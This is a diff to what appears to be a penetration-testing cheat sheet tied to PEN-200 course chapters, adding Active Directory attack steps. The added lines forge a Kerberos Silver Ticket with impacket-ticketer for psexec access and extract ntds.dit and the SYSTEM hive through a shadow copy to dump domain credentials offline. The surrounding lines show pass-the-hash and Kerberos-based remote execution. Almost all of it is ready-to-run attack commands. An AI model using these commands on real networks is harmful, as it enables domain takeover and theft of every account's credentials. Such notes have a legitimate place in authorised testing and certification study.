@@ -492,6 +492,24 @@ impacket-psexec -k -no-pass corp.local/user@TARGET_IP
 impacket-getTGT corp.local/user -hashes :NTHASH -dc-ip DC_IP
 export KRB5CCNAME=user.ccache
 impacket-smbexec -k -no-pass corp.local/user@TARGET_IP
+
+# Silver Ticket — forge a TGS for ONE service using a cracked service account hash.
+# Use this when Kerberoast gave you a SPN-account hash and DCSync/psexec-as-DA is blocked.
+# (PEN-200 ch 23.2.4)
+python3 -c 'from impacket.ntlm import compute_nthash; import sys; print(compute_nthash(sys.argv[1]).hex())' 'CRACKED_PASS'
+impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID -domain corp.local \
+  -spn cifs/targethost.corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass targethost.corp.local
+
+# Shadow Copies fallback — extract ntds.dit when DCSync is blocked but you have
+# a shell on the DC as local admin. (PEN-200 ch 24.2.2)
+# Run on the DC (cmd as admin):
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+# Exfil to Kali (servr.sh) then dump offline:
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 ---
